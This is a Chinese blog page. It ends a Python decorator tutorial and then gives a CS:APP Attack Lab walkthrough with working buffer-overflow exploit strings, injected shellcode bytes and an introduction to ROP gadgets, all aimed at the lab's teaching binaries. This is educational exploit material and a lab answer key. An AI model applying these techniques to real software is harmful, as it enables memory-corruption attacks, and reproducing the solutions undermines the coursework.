<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import registration_param</span><br><span class="line">running register(active&#x3D;False)-&gt;decorate(&lt;function f1 at 0x1027fe0d0&gt;)</span><br><span class="line">running register(active&#x3D;True)-&gt;decorate(&lt;function f2 at 0x1027fe268&gt;)</span><br><span class="line">&gt;&gt;&gt; registration_param.registry</span><br><span class="line">&#123;&lt;function registration_param.f2&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>现在，仅仅 <code>f2</code> 被注册了；<code>f1</code> 没有被注册，因为 <code>active=False</code> 被传入了装饰器工厂。如果不使用 <code>@</code> 语法糖，我们按照普通的函数调用来使用 <code>register</code>，那么装饰 <code>f</code> 的方式应该是 <code>register()(f)</code>，或者 <code>register(active=False)(f)</code>。</p>
<p>我们现在讨论的参数化的装饰器还是要比大多数简单的。如果我们要让装饰器接受额外的参数，并且要用新的函数还替换被装饰函数，那么我们的装饰器工厂就又会多一层嵌套。</p>
<p>现在，我们回顾下 <code>clock</code> 装饰器，希望让它可以接受新的参数来控制输出格式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">DEFAULT_FMT = <span class="string">'[&#123;elapsed:0.8f&#125;s] &#123;name&#125;(&#123;args&#125;) -&gt; &#123;result&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clock</span><span class="params">(fmt = DEFAULT_FMT)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">clocked</span><span class="params">(*_args)</span>:</span></span><br><span class="line">            t0 = time.time()</span><br><span class="line">            _result = func(*_args)</span><br><span class="line">            elapsed = time.time() - t0</span><br><span class="line">            name = func.__name__</span><br><span class="line">            args = <span class="string">', '</span>.join(repr(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> _args)</span><br><span class="line">            result = repr(_result)</span><br><span class="line">            print(fmt.format(**locals()))</span><br><span class="line">            <span class="keyword">return</span> _result</span><br><span class="line">        <span class="keyword">return</span> clocked</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line"><span class="meta">    @clock()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">snooze</span><span class="params">(seconds)</span>:</span></span><br><span class="line">        time.sleep(seconds)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        snooze(<span class="number">.123</span>)</span><br></pre></td></tr></table></figure>

<p>运行代码，我们可以得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[0.12418222s] snooze(0.123) -&gt; None</span><br><span class="line">[0.12602901s] snooze(0.123) -&gt; None</span><br><span class="line">[0.12367606s] snooze(0.123) -&gt; None</span><br></pre></td></tr></table></figure>

<p>我们传入参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> clockdeco_param <span class="keyword">import</span> clock</span><br><span class="line"></span><br><span class="line"><span class="meta">@clock("&#123;name&#125;(&#123;args&#125;) dt=&#123;elapsed:0.3f&#125;s")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">snooze</span><span class="params">(seconds)</span>:</span></span><br><span class="line">    time.sleep(seconds)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    snooze(<span class="number">.123</span>)</span><br></pre></td></tr></table></figure>

<p>运行可以得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snooze(0.123) dt&#x3D;0.128s</span><br><span class="line">snooze(0.123) dt&#x3D;0.124s</span><br><span class="line">snooze(0.123) dt&#x3D;0.125s</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们从没有内嵌函数的 <code>@register</code> 装饰器开始，到带参数的有两层嵌套函数的 <code>@clock()</code>，讨论了装饰器的使用方式和工作原理，也讨论了标准库中的实用的装饰器 <code>wraps</code>，<code>lru_cache</code>，<code>singledispatch</code>。</p>
<p>为了理解装饰器的工作方式，理解 <em>import time</em> 和 <em>run time</em> 的区别，我们研究了变量作用域，闭包以及 <code>global</code> 和 <code>nonlocal</code> 关键字。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/07/09/csapp-attacklab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/09/csapp-attacklab/" class="post-title-link" itemprop="url">【深入理解计算机系统实验笔记】| Attack Lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-07-09 21:20:23" itemprop="dateCreated datePublished" datetime="2017-07-09T21:20:23+08:00">2017-07-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/07/09/csapp-attacklab/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/07/09/csapp-attacklab/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？</p>
<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 <code>ctarget</code> 中，<code>getbuf</code> 被函数 <code>test</code> 调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit.  Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们希望 <code>getbuf()</code> 在返回后，调用函数 <code>touch1</code> 而不是输出 val 的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们具体要做的事情就是把 <code>touch1</code> 的开始地址放到 <code>getbuf</code> 的 <code>ret</code> 指令中，而且需要注意应该使用小端字节序。</p>
<p>首先，我们反汇编 <code>ctarget</code>：<code>objdump -d ctarget &gt; touch1.s</code><br><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png" alt="Screen Shot 2017-05-14 at 20.32.42"></p>
<p>在 touch1.s 中找到 <code>getbuf</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>我们可以看到，<code>getbuf</code> 将 <code>%rsp</code> 移动了 <code>0x28</code> 也就是 40 字节。这也就意味着，在往上 4 个字节，就是返回到 <code>test</code> 的返回地址。所以，我们就可以利用缓冲区溢出将返回地址修改掉。</p>
<p>现在我们看看 <code>touch1</code> 在哪里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>touch1</code> 的开始地址在 <code>0x004017c0</code>，所以我们输入的字符串可以是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>

<p>然后，我们将这个字符文件转换为字节码 <code>./hex2raw &lt; touch1.txt &gt; touch1_r.txt</code>，然后执行 <code>./ctarget -q -i touch1_r.txt</code>:</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.58.30.png" alt="Screen Shot 2017-05-14 at 20.58.30"></p>
<p>通过第一关，我们就学习了通过使用缓冲区溢出来调用另外的函数。</p>
<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>第二阶段要求向程序中注入一小段代码，<code>ctarget</code> 中的 <code>touch2</code> 的 C 语言代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;    <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要把自己的 cookie 作为参数传入，因为只有一个参数，所以参数应该被放入寄存器 <code>%rdi</code>，并使用<code>ret</code> 跳转。</p>
<p>我们写好需要注入的汇编代码，首先将 cookie 的值保存到寄存器 <code>%rdi</code>，然后将 <code>touch2</code> 的地址压入栈中，最后返回：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来，我们将汇编代码转换为机器码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch2.s</span><br><span class="line">objdump -d touch2.o &gt; touch2.bytes</span><br></pre></td></tr></table></figure>

<p>touch2.bytes 中的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">touch2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>为了执行这段代码，我们需要使用阶段 1 中的方法，跳转到缓冲区的开始位置，去执行我们注入的代码。为了知道缓冲区的起始位置，我们使用 GDB 来调试程序，查看 <code>%rsp</code> 的值。我们在 0x4017b4 处设置断点：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.34.41.png" alt="Screen Shot 2017-05-15 at 20.34.41"></p>
<p>然后查看寄存器信息：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.35.08.png" alt="Screen Shot 2017-05-15 at 20.35.08"></p>
<p>可以看到缓冲区的起始位置为 0x5561dc78。</p>
<p>接下来我们就构造需要的字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa </span><br><span class="line">97 b9 59 68 </span><br><span class="line">ec 17 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

<p>然后，我们使用 <code>./hex2raw &lt; touch2.txt &gt; touch2_r.txt</code> 生成字节码，然后执行命令 <code>./ctarget -i touch2_r.txt -q</code>，就可以看到执行结果：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.52.44.png" alt="Screen Shot 2017-05-15 at 20.52.44"></p>
<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>第三阶段同样要实现代码注入攻击，但是要传入一个额外的字符串。</p>
<p>在 <code>ctarget</code> 中 <code>hexmatch</code> 和 <code>touch3</code> 的 C 语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch3!: You called You called touch3(\"%s\")\n"</span>, sval)</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要在引爆字符串中包含自己 cookie 的字符串表示，这个字符串应该是 8 个 16 进制数字，并以 0 为结尾。这个字符串的地址应该被保存在 <code>%rdi</code> 中。当函数 <code>hexmatch</code> 和 <code>strncmp</code> 被调用的时候，他们会把参数保存到栈上，这会覆盖 <code>getbuf</code> 写入的部分内容。所以，我们需要小心引爆字符串的存放位置。</p>
<p>首先将我的 cookie 转换为 字符串形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>为了测试 <code>hexmatch</code> 的行为，我们对上一节的字节码稍作修改，将我的 cookie 的字符串表示存储在缓冲区内，并使程序跳转到 <code>touch3</code>，构造字节码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>

<p>跳转到 <code>touch3</code> 后，我们可以找到调用 <code>hexmatch</code> 的位置，于是可以分别在前后两行设置断点，并观察缓冲区的变化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br></pre></td></tr></table></figure>

<p>在调用 <code>hexmatch</code> 之前，我们可以看到缓冲区的信息如下：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.02.55.png" alt="Screen Shot 2017-05-21 at 16.02.55"></p>
<p>在调用 <code>hexmatch</code> 之后，我们可以看到缓冲区信息为：<br><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.03.06.png" alt="Screen Shot 2017-05-21 at 16.03.06"></p>
<p>可以看到，缓冲区前三行的内容全部为打乱了，我们保存的字符串信息也被完全破坏了。所以，我们需要为字符串寻找一个新的存放位置。</p>
<p>看到最后一行，<code>0x5561dcb8</code> 之后的位置没有被使用，而且刚好可以存放我们的字符串，所以，抱着试一试的态度，我将字符串目标地址设置为 <code>0x5561dcb8</code>，并将 cookie 的字符串信息保存到相应位置。</p>
<p>汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dcb8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>构造字符串为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b8 </span><br><span class="line">dc 61 55 68 </span><br><span class="line">fa 18 40 00 </span><br><span class="line">c3 00 00 00 </span><br><span class="line">35 39 62 39 </span><br><span class="line">39 37 66 61 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure>

<p>运行程序：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.19.59.png" alt="Screen Shot 2017-05-21 at 16.19.59"></p>
<p>成功！</p>
<h2 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从第四阶段开始，我们要对 <code>rtarget</code> 进行缓冲区攻击。但是攻击 <code>rtarget</code> 要更加困难，因为它采用了两种方法来防止缓冲区攻击：</p>
<ol>
<li>栈的内容是随机的，每次运行时，栈中内容的地址都不一样。所以我们无法决定应该跳转的地址。</li>
<li>栈中代码是不可以执行的，所以即使我们可以跳转到注入代码，程序也会遇到段错误。</li>
</ol>
<p>幸运的是，我们可以通过执行已有的代码来达到我们的目的，而不是注入新的代码，这种方法被称为 <code>return-oriented-programming</code>（ROP）。ROP 的策略是在程序中找到指定的字节序列，这些字节序列包含某些指令并以<code>ret</code>结尾。这样的一个字节序列被称为一个 <em>gadget</em>。</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.09.59.png" alt="Screen Shot 2017-07-09 at 20.09.59"><br>由上图可以看出，栈可以用来设置跳转到 n 个 <em>gadget*，并执行其中的代码。使用这种方式，利用 <code>ret</code> 指令，我们可以运行一连串的 *gadget</em> 并执行其中的代码。</p>
<p>例如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span> </span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它对应的汇编代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b:       c3                      retq</span><br></pre></td></tr></table></figure>

<p>字节序列 <code>48 89 c7</code> 编码了指令 <code>movq %rax, %rdi</code>，这个字节序列后面跟着 <code>c3</code>，也就是 <code>ret</code> 指令，它可以让我们跳入下一个 <em>gadget</em>。那么我们就可以利用字节序列的开始地址 <code>0x400f19</code> 还使用指令。</p>
<p>指令的16进制编码可以在下表中查看：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.34.png" alt="Screen Shot 2017-07-09 at 20.20.34"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.54.png" alt="Screen Shot 2017-07-09 at 20.20.54"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.01.png" alt="Screen Shot 2017-07-09 at 20.21.01"><br><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.10.png" alt="Screen Shot 2017-07-09 at 20.21.10"></p>
<p>另外两个指令是：</p>
<ul>
<li><code>ret</code>：字节编码为 <code>0xc3</code></li>
<li><code>nop</code>：让程序计数器加一，什么都不做，字节编码为<code>0x90</code></li>
</ul>
